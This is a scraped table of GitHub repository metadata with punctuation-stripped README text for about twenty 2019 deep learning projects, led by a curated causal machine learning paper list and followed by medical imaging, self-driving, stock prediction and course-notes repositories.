jvpoulos,causal-ml,causal-discovery#causal-inference#causal-learning#causal-models#counterfactual#counterfactual-learning#estimating-treatment-effects#heterogeneous-treatment-effects#paper-list#randomized-controlled-trials#representation-learning#treatment-effects,Must read recent papers and resources on CausalML Contributions are welcome Inspired by GNNpapers https github com thunlp GNNPapers Content content 1 Surveys 2 Counterfactual prediction individual treatment effects 3 Representation learning 4 Dimensionality reduction regression adjustment 5 Heterogeneous treatment effects 6 Missing data imputation 7 Semiparametric double robust inference 8 Policy learning causal discovery 9 Causal recommendation 10 Applications emsp10 1 Social Sciences ensp10 2 Text 11 Resources emsp11 1 Workshops emsp11 2 Proceedings ensp11 3 Code libraries emsp11 4 Benchmark datasets emsp11 5 Courses emsp11 6 Industry Survey papers content 1 Machine learning and causal inference for policy evaluation KDD 2015 paper https dl acm org citation cfm id 2785466 Susan Athey Counterfactual prediction individual treatment effects content 1 Generative Learning of Counterfactual for Synthetic Control Applications in Econometrics arXiv 2019 paper https arxiv org abs 1910 07178 Chirag Modi Uros Seljak 1 Adapting Neural Networks for the Estimation of Treatment Effects arXiv 2019 paper https arxiv org abs 1906 02120 code http github com claudiashi57 dragonnet Claudia Shi David M Blei Victor Veitch 1 RNN based counterfactual prediction arXiv 2019 paper https arxiv org abs 1712 03553 code https github com jvpoulos rnns causal Jason Poulos 1 Matrix Completion Methods for Causal Panel Data Models arXiv 2018 paper https arxiv org abs 1710 10251 Susan Athey Mohsen Bayati Nikolay Doudchenko Guido Imbens Khashayar Khosravi 1 Forecasting Treatment Responses Over Time Using Recurrent Marginal Structural Networks NIPS 2018 paper http proceedings mlr press v70 hartford17a html Bryan Lim Ahmed Alaa Mihaela van der Schaar 1 GANITE Estimation of Individualized Treatment Effects using Generative Adversarial Nets ICLR 2018 paper https openreview net pdf id ByKWUeWA Jinsung Yoon James Jordon Mihaela van der Schaar 1 Estimation of Individual Treatment Effect in Latent Confounder Models via Adversarial Learning arXiv 2018 paper https arxiv org abs 1811 08943 Changhee Lee Nicholas Mastronarde Mihaela van der Schaar 1 Deep IV A Flexible Approach for Counterfactual Prediction PMLR 2017 paper http proceedings mlr press v70 hartford17a html Uri Shalit Fredrik D Johansson David Sontag 1 Causal Effect Inference with Deep Latent Variable Models arXiv 2017 paper https arxiv org abs 1705 08821 Christos Louizos Uri Shalit Joris Mooij David Sontag Richard Zemel Max Welling 1 Estimating individual treatment effect generalization bounds and algorithms PMLR 2017 paper http proceedings mlr press v70 shalit17a html code https github com clinicalml cfrnet Uri Shalit Fredrik D Johansson David Sontag Representation learning content 1 Representation Learning for Treatment Effect Estimation from Observational Data NeurIPS 2019 paper https papers nips cc paper 7529 representation learning for treatment effect estimation from observational data pdf Liuyi Yao et al 1 Invariant Models for Causal Transfer Learning JMLR 2018 paper http jmlr org papers v19 16 432 html Mateo Rojas Carulla Bernhard Schlkopf Richard Turner Jonas Peters 1 Learning Representations for Counterfactual Inference arXiv 2018 paper https arxiv org abs 1605 03661 code https github com clinicalml cfrnet Fredrik D Johansson Uri Shalit David Sontag Dimensionality reduction regression adjustment content 1 Robust Synthetic Control JMLR 2019 paper http www jmlr org papers volume19 17 777 pdf Muhammad Amjad Devavrat Shah Dennis Shen 1 ArCo An artificial counterfactual approach for high dimensional panel time series data Journal of Econometrics 2018 paper https papers ssrn com sol3 papers cfm abstractid 2823687 Carlos Carvalho Ricardo Masini Marcelo C Medeiros 1 Lasso adjustments of treatment effect estimates in randomized experiments PNAS 2016 paper https www pnas org content 113 27 7383 short Adam Bloniarz Hanzhong Liu Cun Hui Zhang Jasjeet S Sekhon Bin Yu Heterogeneous treatment effects content 1 Generalized Random Forests Annals of Statistics 2019 paper https arxiv org abs 1610 01271 Susan Athey Julie Tibshirani Stefan Wager 1 Machine Learning Estimation of Heterogeneous Treatment Effects with Instruments NeurIPS 2019 paper https arxiv org abs 1905 10176 Vasilis Syrgkanis Victor Lei Miruna Oprescu Maggie Hei Keith Battocchi Greg Lewis 1 Orthogonal Random Forest for Causal Inference PMLR 2019 paper http proceedings mlr press v97 oprescu19a html Miruna Oprescu Vasilis Syrgkanis Zhiwei Steven Wu 1 Meta learners for Estimating Heterogeneous Treatment Effects using Machine Learning PNAS 2019 paper https arxiv org abs 1706 03461 Miruna Oprescu Vasilis Syrgkanis Zhiwei Steven Wu 1 Machine Learning Analysis of Heterogeneity in the Effect of Student Mindset Interventions Observational Studies 2019 paper https arxiv org abs 1811 05975 Fredrik D Johansson 1 Estimation and Inference of Heterogeneous Treatment Effects using Random Forests JASA 2018 paper https amstat tandfonline com doi full 10 1080 01621459 2017 1319839 XaPLBeZKhhE Stefan Wager Susan Athey 1 Limits of Estimating Heterogeneous Treatment Effects Guidelines for Practical Algorithm Design PMLR 2018 paper http proceedings mlr press v80 alaa18a html Ahmed Alaa Mihaela Schaar 1 Transfer Learning for Estimating Causal Effects using Neural Networks arXiv 2018 paper https arxiv org abs 1808 07804 Sren R Knzel Bradly C Stadie Nikita Vemuri Varsha Ramakrishnan Jasjeet S Sekhon Pieter Abbeel 1 Recursive partitioning for heterogeneous causal effects PNAS 2016 paper https www pnas org content 113 27 7353 Susan Athey Guido Imbens 1 Machine Learning Methods for Estimating Heterogeneous Causal Effects ArXiv 2015 paper https arxiv org abs 1504 01132v1 Susan Athey Guido W Imbens Missing data imputation content 1 NAOMI Non Autoregressive Multiresolution Sequence Imputation arXiv 2019 paper https arxiv org abs 1901 10946 Yukai Liu Rose Yu Stephan Zheng Eric Zhan Yisong Yue 1 GAIN Missing Data Imputation using Generative Adversarial Nets ICML 2018 paper http medianetlab ee ucla edu papers ICMLGAIN pdf code https github com jsyoon0823 GAIN Jinsung Yoon James Jordon Mihaela van der Schaar 1 MIDA Multiple Imputation using Denoising Autoencoders arXiv 2018 paper https arxiv org abs 1705 02737 code https github com lgondara loss to followup DAE Lovedeep Gondara Ke Wang 1 Recurrent Neural Networks for Multivariate Time Series with Missing Values Scientific Reports 2018 paper https www nature com articles s41598 018 24271 9 code https github com zhiyongc GRU D Zhengping Che Sanjay Purushotham Kyunghyun Cho David Sontag Yan Liu 1 BRITS Bidirectional Recurrent Imputation for Time Series NeurIPS 2018 paper https papers nips cc paper 7911 brits bidirectional recurrent imputation for time series pdf Wei Cao et al 1 Estimating Missing Data in Temporal Data Streams Using Multi directional Recurrent Neural Networks arXiv 2017 paper https arxiv org abs 1711 08742 code https github com jsyoon0823 MRNN Jinsung Yoon William R Zame Mihaela van der Schaar 1 Geometric Matrix Completion with Recurrent Multi Graph Neural Networks NeurIPS 2017 paper https papers nips cc paper 6960 geometric matrix completion with recurrent multi graph neural networks pdf code https github com dtsbourg magnesium Federico Monti Michael M Bronstein Xavier Bresson 1 Modeling Missing Data in Clinical Time Series with RNNs JMLR 2016 paper http proceedings mlr press v56 Lipton16 pdf Zachary C Lipton David C Kale Randall Wetzel Semiparametric double robust inference content 1 Sparsity Double Robust Inference of Average Treatment Effects arXiv 2019 paper https arxiv org abs 1905 00744 Jelena Bradic Stefan Wager Yinchu Zhu 1 Time Series Deconfounder Estimating Treatment Effects over Time in the Presence of Hidden Confounders arXiv 2019 paper https arxiv org abs 1902 00450 Ioana Bica Ahmed M Alaa Mihaela van der Schaar 1 Deep Neural Networks for Estimation and Inference arXiv 2019 paper https arxiv org abs 1809 09953 Max H Farrell Tengyuan Liang Sanjog Misra 1 Approximate Residual Balancing De Biased Inference of Average Treatment Effects in High Dimensions JRSS B 2018 paper https arxiv org abs 1604 07125 Susan Athey Guido W Imbens Stefan Wager 1 Deep Counterfactual Networks with Propensity Dropout arXiv 2017 paper https arxiv org abs 1706 05966 Ahmed M Alaa Michael Weisz Mihaela van der Schaar 1 Double Debiased Machine Learning for Treatment and Causal Parameters arXiv 2017 paper https arxiv org abs 1608 00060 Victor Chernozhukov Denis Chetverikov Mert Demirer Esther Duflo Christian Hansen Whitney Newey James Robins 1 Doubly Robust Policy Evaluation and Optimization Statistical Science 2014 paper https arxiv org abs 1503 02834 Miroslav Dudk Dumitru Erhan John Langford Lihong Li Policy learning causal discovery content 1 A Meta Transfer Objective for Learning to Disentangle Causal Mechanisms arXiv 2019 paper https arxiv org abs 1901 10912 Yoshua Bengio Tristan Deleu Nasim Rahaman Rosemary Ke Sbastien Lachapelle Olexa Bilaniuk Anirudh Goyal Christopher Pal 1 Causal Discovery with Reinforcement Learning arXiv 2019 paper https arxiv org abs 1906 04477 Shengyu Zhu Zhitang Chen 1 Adversarial Generalized Method of Moments arXiv 2019 paper https arxiv org abs 1803 07164 code https github com vsyrgkanis adversarialgmm Greg Lewis Vasilis Syrgkanis 1 CausalGAN Learning Causal Implicit Generative Models with Adversarial Training arXiv 2019 paper https arxiv org abs 1709 02023 Murat Kocaoglu Christopher Snyder Alexandros G Dimakis Sriram Vishwanath 1 Learning When to Treat Policies arXiv 2019 paper https arxiv org abs 1905 09751 Xinkun Nie Emma Brunskill Stefan Wager 1 Learning Neural Causal Models from Unknown Interventions arXiv 2019 paper https arxiv org abs 1910 01075 Nan Rosemary Ke Olexa Bilaniuk Anirudh Goyal Stefan Bauer Hugo Larochelle Chris Pal Yoshua Bengio 1 Counterfactual Policy Optimization Using Domain Adversarial Neural Networks ICML 2018 paper http medianetlab ee ucla edu papers cftreatv5 Onur Atan William R Zame Mihaela van der Schaar 1 Causal Bandits Learning Good Interventions via Causal Inference NIPS 2016 paper https papers nips cc paper 6195 causal bandits learning good interventions via causal inference Finnian Lattimore Tor Lattimore Mark D Reid 1 Counterfactual Risk Minimization Learning from Logged Bandit Feedback arXiv 2015 paper https arxiv org abs 1502 02362 Adith Swaminathan Thorsten Joachims Causal recommendation content 1 The Deconfounded Recommender A Causal Inference Approach to Recommendation arXiv 2019 paper https arxiv org abs 1808 06581 Yixin Wang Dawen Liang Laurent Charlin David M Blei 1 The Blessings of Multiple Causes arXiv 2019 paper https arxiv org abs 1805 06826 Yixin Wang David M Blei comments 3 Comment Reflections on the Deconfounder arXiv 2019 paper https arxiv org abs 1910 08042 Alexander D Amour 1 On Multi Cause Causal Inference with Unobserved Confounding Counterexamples Impossibility and Alternatives arXiv 2019 paper https arxiv org abs 1902 10286 Alexander D Amour 1 Comment on Blessings of Multiple Causes arXiv 2019 paper https arxiv org abs 1910 05438 Elizabeth L Ogburn Ilya Shpitser Eric J Tchetgen Tchetgen 1 The Blessings of Multiple Causes A Reply to Ogburn et al 2019 arXiv 2019 paper https arxiv org abs 1910 07320 Yixin Wang David M Blei 7 Recommendations as Treatments Debiasing Learning and Evaluation PMLR 2016 paper http proceedings mlr press v48 schnabel16 html Tobias Schnabel Adith Swaminathan Ashudeep Singh Navin Chandak Thorsten Joachims 1 Collaborative Prediction and Ranking with Non Random Missing Data RecSys 2009 paper http www cs toronto edu zemel documents acmrec2009 MarlinZemel pdf Benjamin M Marlin Richard S Zemel Applications content Social sciences content 1 State Building through Public Land Disposal An Application of Matrix Completion for Counterfactual Prediction arXiv 2019 paper https arxiv org abs 1903 08028 code https github com jvpoulos homesteads Jason Poulos 1 Estimating Treatment Effects with Causal Forests An Application arXiv 2019 paper https arxiv org abs 1902 07409 Susan Athey Stefan Wager 1 Ensemble Methods for Causal Effects in Panel Data Settings AER P P 2019 paper https arxiv org abs 1903 10079 Susan Athey Mohsen Bayati Guido W Imbens Zhaonan Qu Text content 1 Counterfactual Story Reasoning and Generation arXIv 2019 paper https arxiv org abs 1909 04076 Lianhui Qin Antoine Bosselut Ari Holtzman Chandra Bhagavatula Elizabeth Clark Yejin Choi 1 How to Make Causal Inferences Using Texts arXIv 2018 paper https arxiv org abs 1802 02163 Naoki Egami Christian J Fong Justin Grimmer Margaret E Roberts Brandon M Stewart Resources content Workshops content 1 NeurIPS 2019 Workshop link http tripods cis cornell edu neurips19causalml 1 NIPS 2018 Workshop link https sites google com view nips2018causallearning home 1 NIPS 2017 Workshop link https sites google com view causalnips2017 s 1 NIPS 2016 Workshop link https sites google com site whatif2016nips 1 NIPS 2013 Workshop link http clopinet com isabelle Projects NIPS2013 Proceedings content 1 PMLR Volume 6 Causality Objectives and Assessment 12 December 2008 Whistler Canada link http proceedings mlr press v6 Code libraries content 1 EconML A Python Package for ML Based Heterogeneous Treatment Effects Estimation link https github com microsoft EconML 1 Uplift modeling and causal inference with machine learning algorithms link https github com uber causalml Benchmark datasets content 1 IHDP Jobs and News benchmarks link https fredjo com 1 Twins link http www nber org data linked birth infant death data vitalstatistics data htm 1 Causality workbench link http www causality inf ethz ch repository php page data Courses content 1 CS7792 Counterfactual Machine Learning link http www cs cornell edu courses cs7792 2016fa Industry industry 1 Causality and Machine Learning Microsoft Research link https www microsoft com en us research group causal inference publications,2019-10-13T23:39:10Z,2019-12-10T21:48:57Z,n/a,jvpoulos,User,1,2,1,29,master,jvpoulos,1,0,0,0,0,0,0
aksub99,MolDQN-pytorch,n/a,MolDQN pytorch A PyTorch Implementation of Optimization of Molecules via Deep Reinforcement Learning,2019-10-19T20:09:32Z,2019-11-23T18:57:44Z,Python,aksub99,User,1,2,0,10,master,aksub99,1,0,0,1,0,0,0
aioperations,ADPR,n/a,ADPR This is the source code for the ADPR An Attention based Deep Learning Point of Interest Recommendation Framework dataprocess py The codes to divide the dataset into training set and test set generateLRtraindata py The codes to generate training data fo the latent representations frome the training set generateattentiondata py The codes to generate training data fo the attention based CNN network frome the training set negativesampling py The codes to generate negative samples models py The codes of the models in this paper latenttraining py The codes to generate the latent representations Attentiontraining py The codes to train he attention based CNN network evaluation py The codes to evaluate the network on the test set,2019-10-24T07:58:43Z,2019-10-25T02:23:54Z,Python,aioperations,Organization,2,2,0,5,master,LuckyDoggy,1,0,0,1,0,0,0
OuAzusaKou,repro_hsic,n/a,Reprohsic Part of reproduction of the paper THE HSIC BOTTLENECK DEEP LEARNING WITHOUT BACK PROPAGATION Environment pytorch 1 0 torchvision 0 3 0 numpy 1 16 4 scipy 1 3 0 scikit learn 0 21 3 Note Still under experiment Result img Image text https github com OuAzusaKou reprohsic blob master checkpointcnnmultilayer2 jpg Image text https github com OuAzusaKou reprohsic blob master checkpointcnnnbpmultilayer2layer 5 png,2019-10-05T06:42:52Z,2019-12-03T13:04:09Z,Jupyter Notebook,OuAzusaKou,User,1,2,0,6,master,OuAzusaKou,1,0,0,0,0,0,0
omar-mohamed,Breast-Cancer-Birads-Classification,n/a,Breast Cancer Birads Classification This is a deep learning project to classify breast cancer Birads from 1 to 5 from mammography and CEDM Images,2019-09-20T19:15:48Z,2019-11-10T19:50:59Z,Python,omar-mohamed,User,1,2,0,17,master,omar-mohamed,1,0,0,1,0,1,0
martijnvwezel,ResNet-Attention-layer-custom-data-set,attention#attention-layer#custom-dataset#deep-learning#resnet#resnet-attention-layer,ResNet with attention layer on custom data set Here is a ResNet with attention layers that are designed for custom data sets There is always a way for improvements but this would get you started The training py is compatible with the CIFAR data sets The attention layer is based on the following github page https github com qubvel residualattentionnetwork commit version 15c111d Usage Install with anaconda python 3 version and Keras Go to the train directory Change in vars py the variables for your data set Always double check if function loadcustomdata is uncommented if you learn on your own data set bash Start training python training py Data set structure The directory names train validation test can be changed in the vars py file if needed In the vars py there are some defines that depense on your data set like the classnames Data set structure pathtodataset train classdirectorys files pathtodataset validation classdirectorys files pathtodataset test classdirectorys files Made by martijnvwezel muino nl and RensHam https github com RensHam,2019-10-06T13:50:34Z,2019-11-14T07:25:04Z,Python,martijnvwezel,User,2,2,0,2,master,RensHam#martijnvwezel,2,0,0,0,0,0,0
particle1331,lizard-torch-course,n/a,lizard torch course These are notebooks I wrote following the course Neural Network Programming Deep Learning with PyTorch https deeplizard com learn playlist PLZbbT5os2xrfNyHZsM6ufI0iZENK9xgG by deeplizard https twitter com deeplizard Contents 1 Introduction https nbviewer jupyter org github particle1331 lizard torch course blob master 1 Introduction ipynb 2 PyTorch Tensors https nbviewer jupyter org github particle1331 lizard torch course blob master 2 PyTorch Tensors ipynb 3 Dataset and Dataloader MNIST https nbviewer jupyter org github particle1331 lizard torch course blob master 3 Dataset and Dataloader MNIST ipynb 4 Object Oriented Neural Networks CNN https nbviewer jupyter org github particle1331 lizard torch course blob master 4 Object Oriented Neural Networks CNN ipynb 5 Training the CNN https nbviewer jupyter org github particle1331 lizard torch course blob master 5 Training the CNN ipynb 6 TensorBoard Hyperparameter Tuning https nbviewer jupyter org github particle1331 lizard torch course blob master 6 TensorBoard for Visualization and Hyperparameter Tuning ipynb Appendix TensorBoard in Google Colab https nbviewer jupyter org github particle1331 lizard torch course blob master Running TensorBoard Colab GPU ipynb Confusion Matrix for Classification https nbviewer jupyter org github particle1331 lizard torch course blob master 7 Confusion Matrix for Classification ipynb,2019-10-03T07:35:51Z,2019-12-03T06:46:19Z,Jupyter Notebook,particle1331,User,1,2,0,16,master,particle1331,1,0,0,0,0,0,0
shashankboosi,Machine-Vision,computer-vision#image#opencv#python3,Machine Vision This repository consists of algorithms related to Images processing Features Segmentation Pattern Recognition and Deep learning focused on Images It consists of problems which are manipulated in both the traditional and the AI way Installation All the packages required for the repository can be obtained using the command pip install requirements txt Datasets 1 Deep Learning The dataset for the deep learning code is MNIST image dataset but in the tabular format where every tuple indicates an image Elements per row 28 28 image with a label 785 elements The dataset is highly visible online 2 Optic Disc Segmentation The dataset for the optic disc segmentation can be acquired from IDRiD https idrid grand challenge org and store the dataset in the Images folder directory The directory representation is as follows Images IDRiD opticdiscsegmentationmasks Label images 54 samples originalretinalimages Input images 54 samples All the datasets required for other related problems are provided with the repository Results and Comparisons 1 Feature extraction Feature extraction is done using the SIFT algorithm which is a texture based feature extractor which extracts keypoints in an image SIFT is applied on an Eiffel Tower image and we check how SIFT is able to match the keypoints from the original image and the rotated image 1 Rotated Image angle 0 degrees 0 degree rotation OutputImages Sift Eiffel Tower OriginalImage0 jpg 2 Rotated Image angle of 45 degrees 45 degree rotation OutputImages Sift Eiffel Tower OriginalImage45 jpg 3 Rotated Image angle of 90 degrees 90 degree rotation OutputImages Sift Eiffel Tower OriginalImage90 jpg Other comparisons are available in OutputImages Sift Code available at src sift py 2 Segmentation The segmentation algorithms that are evaluated and compared are Water Shed and Means Shift algorithm 1 The segmentaion results on a strawberry toy image is segmentation OutputImages Segmentation strawberry png Other comparisons are available in OutputImages Segmentation Code available at src segmentation py 3 Pattern Recognition The confusion matrix for the result obtained from KNN on the scikit learn digits dataset is knn confusion matrix OutputImages Patternrecognition knnconfusionmatrix png Code available at src patternrecognition py 4 Deep Learning The loss vs epochs graph for the deeplearning code on MNIST dataset is learningCurve OutputImages DeepLearning lossvsepochs png Code available at src deeplearning py 5 Oil Painting Oil painting is implemented from scratch as part of the learning process of manipulating images and it is implemented on a Sydney tram image Oil painting is done on the image using different filter sizes and the results are oil paint OutputImages Oil Paint plots combinedGrayRailImageWithAll3Filters png For detailed description about the project kindly look at the paper report Oil Paint report pdf where everything about the implementation is explained visually All the codes related are available in the directory src Oil Paint 6 Optic Disc Segmentation The Optic Disc Segmentation is evaluated on the IDRiD dataset with 54 images 1 Image of a good prediction of the optic disc good prediction report IDRiD images good PNG 2 Image of a bad prediction of the optic disc bad prediction report IDRiD images bad PNG For detailed description about the project kindly look at the paper report IDRiD paper pdf which explains the implementation in detail and also about the reasons for the prediction All the codes related are available in the directory src IDRiD Acknowledgement I would like to thank Arcot Soumya and her team for supporting me with the materials and the knowledge required to learn Machine Vision,2019-09-24T04:36:28Z,2019-12-01T23:27:14Z,Python,shashankboosi,User,1,2,0,80,master,shashankboosi,1,0,0,0,0,0,7
soarbear,stocks-lstm-keras,keras#lstm#prediciton#price#rnn#stock,Description Use the deep learning recursive neural network keras RNN LSTM to search for stocks that rise from the next day on multiple stocks Environment Google Colab CPU GPU TPU keras 2 2 5 LSTM Ubuntu 18 04 3 LTS Python 3 6 8 Numpy 1 17 3 Pandas 0 25 2 sklearn 0 21 3 Result alt text https github com soarbear stocks lstm keras blob master stocks letm keras jpg Other Language Disclaimer The developer will not be responsible for Any losses made by using or referring to the tool Understand the risks involved using or referring to the bot on your own responsibility,2019-10-26T00:00:24Z,2019-11-12T02:53:34Z,Python,soarbear,User,1,2,0,13,master,soarbear,1,0,0,0,0,0,0
ishritam,Self-Driving-Car,n/a,Self Driving Car We are here building a minimal version of self driving car Here we have a front camera view This will transfer input to the computer Then Deep Learning algorithm in computer predicts the steering angle to avoid all sorts of collisions Predicting steering angle can be thought of as a regression problem We will feed images to Convolutional Neural Network and the label will be the steering angle in that image Model will learn the steering angle from the as per the turns in the image and will finally predicts steering angle for unknown images Finalshort https user images githubusercontent com 40149802 65960162 71037480 e471 11e9 92a5 ed0ca6e07af1 gif Dataset Refer this https github com SullyChen Autopilot TensorFlow There are total 45406 images in the dataset along with their steering angles We will split the dataset into train and test in a ratio of 70 30 sequentially Model Preview image https user images githubusercontent com 40149802 65964220 16224b00 e47a 11e9 92c8 48a2e07014e9 png You can download my final model from here https drive google com drive folders 1aw827ecHqYAHr9kdPTpyC6lfX39J1sgV usp sharing Objective Our objective is to predict the correct steering angle from the given test image of the road Here our loss is Mean Squared Error MSE Our goal is to reduce the MSE error as low as possible Prerequisites You need to have installed following softwares and libraries in your machine before running this project Python 3 https www python org downloads Anaconda It will install ipython notebook and most of the libraries which are needed like pandas matplotlib numpy and scipy https www anaconda com download Libraries Tensorflow It is a deep learning library pip install tensorflow OpenCV It is used for processing images pip install opencv python,2019-10-01T12:01:10Z,2019-10-03T09:50:23Z,Jupyter Notebook,ishritam,User,1,2,1,6,master,ishritam,1,0,0,1,0,0,0
GongJingUSST,DL_Radiomics_Fusion,n/a,DLRadiomicsFusion Comparison and fusion of deep learning and radiomics features of ground glass nodules to predict the invasiveness risk of stage I lung adenocarcinomas in CT scan,2019-09-25T02:45:13Z,2019-11-11T01:27:55Z,Python,GongJingUSST,User,1,2,1,14,master,GongJingUSST,1,0,0,0,0,0,0
kaburelabs,Computer-Vision,n/a,Computer Vision This repository covers the fundamentals from image pre processing computer Vision I m working on Computer Vision tasks and I will commit the projects on this folder,2019-10-10T01:22:48Z,2019-10-19T14:34:57Z,Jupyter Notebook,kaburelabs,User,1,2,0,16,master,kaburelabs,1,0,0,0,0,0,0
YuktiMohan,SIG_Deep_Learning,n/a,SIGDeepLearning This repository contains all the class notes of the Deep Learning SIG,2019-10-21T10:05:56Z,2019-10-31T13:46:01Z,Jupyter Notebook,YuktiMohan,User,1,1,7,25,master,YuktiMohan#abhishek-parashar,2,0,0,0,0,0,6
mdfarragher,DLR,n/a,DLR Deep Learning with C and CNTK,2019-10-16T10:44:27Z,2019-12-11T15:02:23Z,C#,mdfarragher,User,1,1,5,47,master,mdfarragher,1,0,0,0,0,0,0
datasigntist,deeplearning,n/a,deeplearning My Deep Learning Adventures,2019-10-14T05:33:49Z,2019-12-06T05:17:41Z,Jupyter Notebook,datasigntist,User,1,1,2,32,master,datasigntist#thalishsajeed,2,0,0,0,0,0,1
rathiromil13,DS-5500-Project-Portfolio-Optimization-Using-Deep-Reinforcement-Learning,n/a,,2019-09-29T22:58:01Z,2019-12-08T17:41:12Z,Jupyter Notebook,rathiromil13,User,3,1,3,62,master,rathiromil13#manvitamarkala#bishishta#SaiKonanki#KonankiSaiCharan,5,0,0,0,0,0,17
thanhhff,CS230-Deep-Learning,n/a,Deep Learning by Stanford University Master Deep Learning and Break into AI Instructor Andrew Ng https www andrewng org Kian Katanforoosh https twitter com kiankatan lang en Introduction This repo contains all my work for this specialization All the code base quiz questions lecture note in Deep Learning Specialization on Coursera https www coursera org specializations deep learning Course Certificate Neural Networks and Deep Learning https www coursera org account accomplishments records UM9CXTUR2M7Y Improving Deep Neural Networks Hyperparameter tuning Regularization and Optimization https www coursera org account accomplishments records ZBT6K55WQEVD Programming Assignments Course 1 Neural Networks and Deep Learning https github com thanhhff CS230 Deep Learning tree master Neural 20Networks 20and 20Deep 20Learning Week 1 Introduction to Deep Learning Non Assignment Week 2 Neural Networks Basics Python Basics with Numpy https github com thanhhff CS230 Deep Learning tree master Neural 20Networks 20and 20Deep 20Learning Week 202 Assignment Python 20Basics 20with 20Numpy Logistic Regression as a Neural Network https github com thanhhff CS230 Deep Learning tree master Neural 20Networks 20and 20Deep 20Learning Week 202 Assignment Logistic 20Regression 20as 20a 20Neural 20Network Week 3 Shallow Neural Networks Planar data classification with a hidden layer https github com thanhhff CS230 Deep Learning tree master Neural 20Networks 20and 20Deep 20Learning Week 203 Assignment Week 4 Deep Neural Network Building your Deep Neural Network Step by Step https github com thanhhff CS230 Deep Learning blob master Neural 20Networks 20and 20Deep 20Learning Week 204 Asignment BuildingyourDeepNeuralNetworkStepbyStepv8a ipynb Deep Neural Network Application https github com thanhhff CS230 Deep Learning blob master Neural 20Networks 20and 20Deep 20Learning Week 204 Asignment Deep 2BNeural 2BNetwork 2B 2BApplication 2Bv8 ipynb Course 2 Improving Deep Neural Networks Hyperparameter tuning Regularization and Optimization https github com thanhhff CS230 Deep Learning tree master Course 202 20 Improving 20Deep 20Neural 20Networks Week 5 Practical Aspects of Deep Learning Initialization https github com thanhhff CS230 Deep Learning blob master Course 202 20 Improving 20Deep 20Neural 20Networks Week 201 Assignment Initialization ipynb Regularization https github com thanhhff CS230 Deep Learning blob master Course 202 20 Improving 20Deep 20Neural 20Networks Week 201 Assignment Regularizationv2a ipynb Gradient Checking https github com thanhhff CS230 Deep Learning blob master Course 202 20 Improving 20Deep 20Neural 20Networks Week 201 Assignment Gradient 2BChecking 2Bv1 ipynb Week 6 Optimization Algorithms Optimization https github com thanhhff CS230 Deep Learning tree master Course 202 20 Improving 20Deep 20Neural 20Networks Week 202 Assigment Week 7 Hyperparameter Tuning Batch Normalization and Programming Frameworks Tensorflow https github com thanhhff CS230 Deep Learning tree master Course 202 20 Improving 20Deep 20Neural 20Networks Week 203 Assigment Course 3 Structuring Machine Learning Projects https www coursera org learn machine learning projects Week 8 ML Strategy 1 Non Assignment Week 9 ML Strategy 2 Non Assignment Course 4 Convolutional Neural Networks https www coursera org learn convolutional neural networks Week 10 Foundations of Convolutional Neural Networks Convolutional Model Step by Step https github com thanhhff CS230 Deep Learning blob master Course 204 20 20Convolutional 20Neural 20Networks Week 201 Assignment ConvolutionmodelStepbyStepv2a ipynb Convolutional Model Application https github com thanhhff CS230 Deep Learning blob master Course 204 20 20Convolutional 20Neural 20Networks Week 201 Assignment ConvolutionmodelStepbyStepv2a ipynb Week 11 Deep convolutional models case studies Keras Tutorial https github com thanhhff CS230 Deep Learning blob master Course 204 20 20Convolutional 20Neural 20Networks Week 202 Assignment KerasTutorialv2a ipynb Residual Networks https github com thanhhff CS230 Deep Learning blob master Course 204 20 20Convolutional 20Neural 20Networks Week 202 Assignment ResidualNetworksv2a ipynb Week 12 Object detection Car detection with YOLO https github com thanhhff CS230 Deep Learning blob master Course 204 20 20Convolutional 20Neural 20Networks Week 203 Assignment AutonomousdrivingapplicationCardetectionv3a ipynb Week 13 Face recognition Neural style transfer Art generation with Neural Style Transfer Face Recognition Milestones 2019 09 27 Finished Course 1 2019 10 26 Finished Course 2 2019 11 17 Finished Course 3 2019 Finished Course 4,2019-09-20T03:48:45Z,2019-12-08T11:28:15Z,Jupyter Notebook,thanhhff,User,2,1,2,90,master,thanhhff,1,0,0,0,0,0,0
sashajenner,Prostate-Deep-Learning,n/a,Prostate Deep Learning Final report https docs google com document d 1J17MVV7rLbTDQ5K3jzZzv3nALXPTQaqM0yUOXSXAcFc edit usp sharing Final presentation marking instruction Script https docs google com document d 1sNNwmoGYSLbhIYftN1bkYi7aMj qqoHJv3bCFJoDxo edit Groups wishing to make use of electronic projection facilities must format their presentation for MS PowerPoint for a PC Alternative software operating systems and laptop computers are not supported Final slides must be submitted here by 11 59pm on the day before the showcase All groups slides will then be collated to one master presentation The presentation will be five minutes excluding questions for each group During the presentation your entire group will be required to be on stage but you can decide how each member participates E g everyone speaks for about a minute or choose one speaker and some others assist with props five speakers and one clicker etc You ll have a chance to test your presentation on stage and make minor adjustments to your speech but not your slides at the rehearsal At the conclusion of the evening i e once all the presentations are finished we will ask one representative from each group to return to the stage to answer questions from the audience It is up to you and your leader to decide how you can most effectively get the message across in the presentation In contrast to the report the audience will be general and the presentation should therefore also be general The oral presentation will be assessed by the Dalyell coordinators mentors attending the showcase evening Criteria for assessment of the presentation Quality of presentation Were the visual aids clear and was the point of each slide obvious Were the details of each slide properly explained Was the overall narrative and logic of presentation easy to follow Was your attention engaged as the presentation unfolded Did the group keep to time Overall design and structure of the talk Was the presentation structured in a way that was comprehensible Did it include intelligible and relevant background material A clear definition of the problem An ordered progression of important concepts and findings Is there a concise summary and conclusion Did you acquire an overall picture of the topic Scientific context and understanding Did the speaker s put the work in context making coherent links to background work and other disciplines where appropriate critically analyse the information successfully identify the most critical and important components of research data understand the relevance of their focus in the context of the discipline area understand the future implications and significance Did the speakers make clear the distinction between background and their own work analysis findings Answers to questions Did the students know the answers to relevant questions Were the answers explained in a comprehensible way Did the student demonstrate reserves of extra knowledge or was a lack of knowledge exposed Final presentation https docs google com presentation d 1rER9d3pVCVqKfDqyKioJYhP68fLMuJx1W1VK5d6EtXQ edit ts 5da593fd slide id gc6f73a04f00,2019-10-08T04:19:59Z,2019-10-27T23:14:27Z,Python,sashajenner,User,1,1,2,66,master,sashajenner#Saze10#riederleeDEV,3,0,0,0,0,0,0
abai05,css634-deep-learning,n/a,css634 deep learning Grades https docs google com spreadsheets d 1e9YlndrVhZI0vwnklgDftXwNyGtnjvWqKRtIE8EsbY edit usp sharing,2019-09-20T05:54:59Z,2019-12-08T14:33:47Z,Jupyter Notebook,abai05,User,2,1,2,19,master,abai05,1,0,0,0,0,0,0
